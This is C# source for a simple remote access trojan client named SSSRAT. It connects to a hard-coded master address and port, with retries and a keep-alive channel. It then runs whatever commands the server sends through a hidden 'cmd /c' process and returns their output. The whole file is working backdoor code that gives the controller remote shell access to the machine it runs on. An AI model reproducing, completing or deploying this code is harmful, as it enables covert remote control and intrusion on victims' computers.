using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SSSRAT {
	class Program {

		static TcpClient client;
		const string MASTER_ADDR = "127.0.0.1";
		const int PORT = 13337;
		const int KA_PORT = 13338;
		const string AUTH = "empty";
		const int MAX_BUFFER = 8192;
		const string SPLITTER = "{_$}";

		static void Main() {
			client = new TcpClient();
			while (!client.Connected) {
				try {
					client.Connect(MASTER_ADDR, PORT);
				} catch { }
				Thread.Sleep(2000);
			}
			byte[] recv = Recv(5);
			if (recv == null)
				return;
			if (GS(recv) != "READY") {
				client.Close();
				Main();
				return;
			}
			if (!Send(GB(AUTH)))
				return;
			recv = Recv(1);
			if (recv == null)
				return;
			if (GS(recv) != "S") {
				client.Close();
				Main();
				return;
			}
			new Thread(Commands).Start();
			new Thread(KeepAlive).Start();
		}

		public static void KeepAlive() {
			var kaClient = new TcpClient();
			kaClient.Connect(MASTER_ADDR, KA_PORT);
			var stm = kaClient.GetStream();
			while (true) {
				var readBuff = new byte[2];
				stm.Read(readBuff, 0, 2);
			}
		}

		public static bool Send(byte[] data, NetworkStream stm = null, int offset = 0, int size = -1) {
			try {
				if (stm == null)
					stm = client.GetStream();
				if (size == -1)
					size = data.Length;
				stm.Write(data, offset, size);
				return true;
			} catch {
				client.Close();
				Main();
				return false;
			}
		}

		public static byte[] Recv(int size, int offset = 0, NetworkStream stm = null) {
			var buffer = new byte[size - offset];
			try {
				if (stm == null)
					stm = client.GetStream();
					stm.Read(buffer, offset, size);
				return buffer;
			} catch {
				client.Close();
				Main();
				return null;
			}
		}

		static void Commands() {
			while (true) {
				byte[] comBuff = Recv(MAX_BUFFER);
				if (comBuff == null) {
					Thread.Sleep(2000);
					return;
				}
				if (!GS(comBuff).StartsWith("COM"))
					continue;
				var splits = CleanOs(GS(comBuff)).Split(new[] { SPLITTER }, StringSplitOptions.None);
				if (splits.Length < 2)
					continue;
				var command = splits[1];
				//
				if (command.StartsWith("CMD")) {
					string cmdCommand;
					try {
						cmdCommand = splits[2];
					} catch {
						continue;
					}
					var procStartInfo = new ProcessStartInfo("cmd", "/c " + cmdCommand) {
						RedirectStandardError = true,
						RedirectStandardOutput = true,
						UseShellExecute = false,
						CreateNoWindow = true
					};
					var proc = new Process();
					var stdout = new StringBuilder();
					proc.OutputDataReceived += (sender, e) => stdout.Append(e.Data + "\r\n");
					proc.StartInfo = procStartInfo;
					proc.Start();
					proc.BeginOutputReadLine();
					proc.WaitForExit();
					proc.CancelOutputRead();
					Send(GB(stdout.ToString()));
				} else if (command == "KA") {
					client.GetStream().Write(GB("KA" + SPLITTER + "ON"), 0, 2);
				}
				Thread.Sleep(1);
			}
		}

		public static byte[] CleanBuffer(byte[] bytes, int size = -1) {
			return new byte[size == -1 ? bytes.Length : size];
		}
		public static string CleanOs(string Str) {
			return Str.Replace("\0", "");
		}
		static string GS(byte[] bytes) {
			return Encoding.ASCII.GetString(bytes);
		}
		static byte[] GB(string str) {
			return Encoding.ASCII.GetBytes(str);
		}
	}
}
